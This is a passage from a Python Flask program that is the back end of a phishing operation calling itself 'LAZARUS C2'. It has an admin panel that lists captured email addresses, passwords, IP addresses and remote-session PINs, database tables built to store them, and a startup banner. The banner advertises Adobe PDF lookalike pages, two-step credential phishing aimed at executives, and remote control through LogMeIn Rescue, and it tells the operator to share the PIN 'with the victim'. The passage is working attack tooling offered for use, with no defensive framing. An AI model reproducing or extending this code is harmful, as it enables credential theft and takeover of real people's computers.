        return 'N/A'
    return html_module.escape(str(value))

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        p = request.form.get('p', '')
        if hmac.compare_digest(p, ADMIN_PASSWORD):
            session['admin'] = True
        else:
            return '<div style="color:red;text-align:center;padding:20px">Invalid password</div>' + _admin_login_form()
    
    if not session.get('admin'):
        return _admin_login_form()
    
    conn = sqlite3.connect(DB_PATH)
    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 50").fetchall()
    sessions = conn.execute("SELECT * FROM sessions ORDER BY id DESC LIMIT 20").fetchall()
    conn.close()
    
    creds_rows = ''
    for c in creds:
        creds_rows += f'<tr><td style="color:#00ff88">{html_escape(c[2])}</td><td style="color:#ffd700">{html_escape(c[3])}</td><td>{html_escape(c[4])}</td><td style="color:#888">{html_escape(c[5][:16] if c[5] else "N/A")}</td></tr>'
    
    sessions_rows = ''
    for s in sessions:
        status_color = '#00ff88' if s[5] == 'active' else '#ffd700'
        sessions_rows += f'<tr><td style="color:#00b3b0">{html_escape(s[1])}</td><td style="color:#ffd700">{html_escape(s[2])}</td><td>{html_escape(s[3])}</td><td style="color:{status_color}">{html_escape(s[5])}</td><td style="color:#888">{html_escape(s[6][:16] if s[6] else "N/A")}</td></tr>'
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>LAZARUS C2 - Command Center</title>
    <meta charset="UTF-8">
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{background:#0a0c10;color:#e0e0e0;font-family:'Courier New',monospace;padding:24px}}
        h1{{color:#ea1c24;font-size:32px;margin-bottom:8px}}
        h2{{color:#ffd700;margin:24px 0 16px;font-size:20px;border-bottom:1px solid #2a2f3e;padding-bottom:8px}}
        .stats{{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin-bottom:30px}}
        .stat-card{{background:#1a1e24;padding:20px;border-radius:16px;border-left:3px solid #ea1c24}}
        .stat-number{{font-size:48px;font-weight:bold;color:#ea1c24}}
        .stat-label{{color:#6c7293;margin-top:8px;font-size:12px}}
        table{{border-collapse:collapse;width:100%;margin-top:15px}}
        th,td{{padding:12px;border-bottom:1px solid #2a2f3e;text-align:left;font-size:13px}}
        th{{color:#ea1c24;border-bottom:2px solid #ea1c24;font-weight:bold}}
        tr:hover{{background:#1a1e24}}
        .footer{{margin-top:40px;text-align:center;color:#6c7293;font-size:11px;padding:20px;border-top:1px solid #2a2f3e}}
        .status-green{{color:#00ff88}}
        .nav{{display:flex;gap:16px;margin:16px 0 24px;flex-wrap:wrap}}
        .nav a{{color:#6c7293;text-decoration:none;font-size:12px;padding:4px 12px;border:1px solid #2a2f3e;border-radius:20px}}
        .nav a:hover{{color:#ea1c24;border-color:#ea1c24}}
    </style>
    </head>
    <body>
        <h1>🎯 LAZARUS C2</h1>
        <p style="color:#6c7293;margin-bottom:20px">Advanced Persistent Threat • PDF Phishing • Remote Control</p>
        
        <div class="nav">
            <a href="#creds">Credentials</a>
            <a href="#sessions">Sessions</a>
            <a href="/health">Status</a>
            <a href="/">Landing</a>
        </div>
        
        <div class="stats">
            <div class="stat-card"><div class="stat-number">{len(creds)}</div><div class="stat-label">Credentials Captured</div></div>
            <div class="stat-card"><div class="stat-number">{len(sessions)}</div><div class="stat-label">Sessions Created</div></div>
            <div class="stat-card"><div class="stat-number">🎯</div><div class="stat-label">Lazarus Active</div></div>
        </div>
        
        <h2 id="creds">🔐 Captured Credentials</h2>
        <table><tr><th>Email</th><th>Password</th><th>IP</th><th>Time</th></tr>{creds_rows}</table>
        
        <h2 id="sessions">🖥️ Sessions</h2>
        <table><tr><th>Session ID</th><th>PIN</th><th>Ref</th><th>Status</th><th>Time</th></tr>{sessions_rows}</table>
        
        <div class="footer">
            LAZARUS-STYLE C2 v2026 | PDF Phishing + LogMeIn Rescue<br>
            Status: <span class="status-green">● OPERATIONAL</span> | 2-STEP PHISHING<br>
            🎯 Target: C-Level Executives (CFO, CEO, Sales Directors)
        </div>
    </body>
    </html>
    '''

def _admin_login_form():
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>Admin Login</title>
    <style>
        body{background:#0a0c10;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Courier New',monospace;margin:0;padding:20px}
        .card{background:#1a1e24;padding:40px;border-radius:20px;width:100%;max-width:360px;border:2px solid #ea1c24}
        h2{color:#ea1c24;margin-bottom:10px;text-align:center;font-size:24px}
        p{color:#6c7293;text-align:center;margin-bottom:24px;font-size:12px}
        input{width:100%;padding:14px;margin:10px 0;background:#0a0c10;border:2px solid #2a2f3e;border-radius:12px;color:#ea1c24;font-family:'Courier New',monospace;font-size:14px;box-sizing:border-box}
        input:focus{outline:none;border-color:#ea1c24}
        button{width:100%;padding:14px;background:#ea1c24;color:#0a0c10;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:14px;font-family:'Courier New',monospace}
        button:hover{background:#ff3333}
    </style>
    </head>
    <body>
        <div class="card">
            <h2>🎯 LAZARUS C2</h2>
            <p>Authorized Personnel Only</p>
            <form method="POST">
                <input type="password" name="p" placeholder="Enter admin password" required autofocus>
                <button type="submit">ACCESS DASHBOARD</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return jsonify({
        "status": "operational",
        "version": "LAZARUS C2 2026",
        "style": "Adobe PDF Phishing",
        "features": ["PDF Simulation", "2-Step Phishing", "LogMeIn Rescue", "Admin Panel"]
    })

# ====================================================================================================
# DATABASE
# ====================================================================================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS creds 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, step INTEGER, email TEXT, 
                  password TEXT, ip TEXT, ts TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS sessions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, session_id TEXT, pin TEXT, 
                  ref TEXT, ip TEXT, status TEXT, ts TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ====================================================================================================
# MAIN
# ====================================================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   🎯 LAZARUS-STYLE C2 v2026 - PDF Phishing + Remote Control        ║
║                                                                      ║
║   STYLE: Adobe Acrobat PDF Viewer                                   ║
║   TARGET: C-Level Executives (CFO, CEO, Sales Directors)           ║
║                                                                      ║
║   FEATURES:                                                         ║
║   ✅ Adobe PDF Lookalike Landing                                   ║
║   ✅ Embedded Session PIN                                           ║
║   ✅ 2-Step Phishing (Personal + Corporate)                       ║
║   ✅ LogMeIn Rescue Integration                                   ║
║   ✅ Zero Download Remote Control                                 ║
║   ✅ Executive-Level Social Engineering                           ║
║                                                                      ║
║   HOW TO FIX PIN ISSUE:                                             ║
║   If you get "PIN 123456 doesn't work":                            ║
║   1. Check your LogMeIn API token is valid                        ║
║   2. Or use MANUAL mode:                                          ║
║      - Go to console.logmeinrescue.com                            ║
║      - Create a session manually                                  ║
║      - Share the PIN with the victim                              ║
║                                                                      ║
║   Serving on http://0.0.0.0:{port}                                   ║
║   Admin:  http://localhost:{port}/admin                             ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
""")
    app.run(host='0.0.0.0', port=port, debug=False)
